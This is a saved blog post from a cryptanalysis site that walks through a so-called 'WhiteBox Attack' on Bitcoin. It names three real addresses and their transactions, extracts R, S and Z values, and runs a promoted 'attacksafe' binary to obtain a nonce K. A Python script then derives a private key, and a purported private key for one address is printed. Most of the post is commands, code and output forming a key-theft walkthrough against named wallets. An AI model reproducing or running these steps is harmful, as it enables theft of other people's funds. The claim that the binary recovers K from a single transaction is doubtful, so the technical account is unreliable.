<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>						</div>

						<button href="#menu" class="menu-link mobile-nav-btn col-auto"><i class="fa fa-bars" aria-hidden="true"></i></button>

						<div id="search-wrapper" class="ml-auto col-auto d-flex">
							<button type="button" id="go-to-field" tabindex="-1"></button>
					    	<button class="search-btn-main"><i class="fa fa-search"></i></button>
					    	
<div class="itng-search-main">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Найти:</span>
					<input type="search" class="search-field" placeholder="Поиск…" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Поиск">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>
						</div>
					</div>
				</div>
			</div>

		</header><!-- #masthead -->
			<div id="content-wrapper" class="container row">
		
	<main id="primary" class="site-main container order-1">

		
<article id="post-1175" class="post-1175 post type-post status-publish format-standard hentry category-cryptanalysis">
	
	<header class="entry-header">
		<h1 class="entry-title">We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key</h1>	</header><!-- .entry-header -->
	
	
	
			<div class="entry-meta">
			<span class="posted-on" style="display: none;"><a href="https://cryptodeeptech.ru/whitebox-attack/" rel="bookmark"><time class="entry-date published" datetime="" style="display: none;"></time><time class="updated" datetime=""></time></a></span><span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>		</div><!-- .entry-meta -->
		
	
	<div class="entry-content">
		
<p class="has-text-align-center"><iframe width="560" height="315" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/dLy74McEFTg.html" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>In this article, we will again touch on the topic of a signature failure in a blockchain transaction and apply a completely new attack:&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“WhiteBox Attack on Bitcoin”</a>&nbsp;.<br>Differential fault analysis&nbsp;<code>(DFA)</code>was briefly described in the literature in 1996 when&nbsp;<em>an Israeli cryptographer and cryptanalyst</em>&nbsp;<code>Eli Biham</code>&nbsp;and&nbsp;<em>an Israeli scientist</em>&nbsp;<code>Adi Shamir</code>&nbsp;showed that they could use error injection to extract the&nbsp;<em>secret key</em>&nbsp;and recover the&nbsp;<em>private key</em>&nbsp;using various signature and verification algorithms.</p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-6-1024x467.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1544"></figure>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-7.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1546"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/crypto.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1541"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-10-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1567"></figure></div>


<p>We implement the&nbsp;<strong><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">“WhiteBox Attack on Bitcoin”</a></strong>&nbsp;with the differential bugs described in this research paper.&nbsp;The classic&nbsp;<code>DFA</code>that we described in the previous&nbsp;<a href="https://cryptodeep.ru/rowhammer-attack/" target="_blank" rel="noreferrer noopener">article</a>&nbsp;is called&nbsp;<code>F()</code>.&nbsp;Some of these attacks also require two signature pairs&nbsp;<code>ECDSA</code>.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-9-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1565"></a><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/whitebox-attack-on-bitcoin" target="_blank" rel="noreferrer noopener"><strong>www.attacksafe.ru/whitebox-attack-on-bitcoin</strong></a></figcaption></figure></div>


<p>The theoretical part of this attack can be found in the article from the list of popular Bitcoin attacks:&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>“WhiteBox Attack on Bitcoin”</strong></a></p>



<p>From our early&nbsp;<a href="https://cryptodeep.ru/publication/" target="_blank" rel="noreferrer noopener">publications,</a>&nbsp;we know that there are a lot of vulnerable and weak transactions in the Bitcoin blockchain, and in the process of our cryptanalysis, we found many Bitcoin Addresses where a large number of signatures&nbsp;<code>ECDSA</code>were made with the disclosure of the secret key&nbsp;<code>"K" (NONCE)</code>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>As a result, knowing the secret key, we can accurately obtain the private key to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Consider three Bitcoin Addresses:</h2>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Each Bitcoin Address made two critical vulnerable transactions:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499">https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499</a></p>



<p><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba">https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1523"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-1-1024x199.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1525"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>



<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-2-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1527"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-3-1024x202.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1529"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859">https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859</a></p>



<p><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e">https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-4-1024x201.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1531"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-5-1024x200.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1533"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Disclosure of the secret key “K” (NONCE) in the Bitcoin blockchain</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing an efficient&nbsp;<a href="https://attacksafe.ru/whitebox-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>WhiteBox Attack</strong></a>&nbsp;algorithm using our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener"><strong>16WhiteBoxAttack repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/16WhiteBoxAttack/

ls</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-11-1024x531.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1575"></figure>



<h3>Install all the packages we need</h3>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-11.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-687"><figcaption class="wp-element-caption"><strong><code>requirements.txt</code></strong></figcaption></figure>



<pre class="wp-block-code"><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-111-1024x448.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1175"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-112-1024x452.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1177"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-114-1024x452.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1179"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2></h2>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499">https://btc1.trezor.io/tx/60d6685d9945ee4037ac6621136e98b53bc97cf71bf2b45f9b93086eebf4a499</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-12-1024x142.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1577"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-14-1024x281.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1581"></figure>



<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>To implement the attack and get the secret key, we will use the&nbsp;</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-14.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-705"></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure></div>


<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-15.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1583"></figure>



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-17.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1586"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-18.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1587"></figure>



<p><code>"ATTACKSAFE SOFTWARE"</code>includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-19-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1589"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-20-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1590"></figure>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-21-1024x631.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1592"></figure>



<p>then choose<code>&nbsp;-tool: whitebox_attack</code></p>



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-22-1024x276.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1594"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-24-1024x482.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1597"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d

RawTX = 0100000001a60ae2965c16c0a72bb764ec4f6f0dc6acfd3af3f49a73c06ae48ddfe4a7b76b020000006a473044022015e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff0102202d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff019e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To do this, install the&nbsp;<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;elliptic curve library :</p>



<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-44-1024x335.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-968"></figure>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-25-1024x86.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1599"></figure>



<p><code>(0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
point2gen  =   (0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01 , 0xacf1d32fbd69a79736bafc6af16135526852cd12e4c19158fb421266f0771e0f)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use the&nbsp;<em>Python</em>&nbsp;script:&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d
R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-26.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1601"></figure>



<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>



